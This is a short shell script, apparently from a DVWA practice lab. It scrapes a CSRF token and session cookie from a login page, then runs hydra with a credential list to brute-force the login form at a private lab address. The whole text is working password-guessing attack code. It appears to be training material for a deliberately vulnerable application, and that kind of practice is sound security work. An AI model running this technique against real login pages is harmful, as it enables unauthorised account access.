CSRF=$(curl -s -c dvwa.cookie "10.1.10.56/login.php" | awk -F 'value=' '/user_token/ {print $2}' | cut -d "'" -f2)
SESSIONID=$(grep PHPSESSID dvwa.cookie | awk -F ' ' '{print $7}')

hydra  -C cred_list.txt \
  -e ns  -F  -u  -t 1  -w 10  -V  10.1.10.56  http-post-form \
  "/login.php:username=^USER^&password=^PASS^&user_token=${CSRF}&Login=Login:S=Location\: index.php:H=Cookie: security=impossible; PHPSESSID=${SESSIONID}"
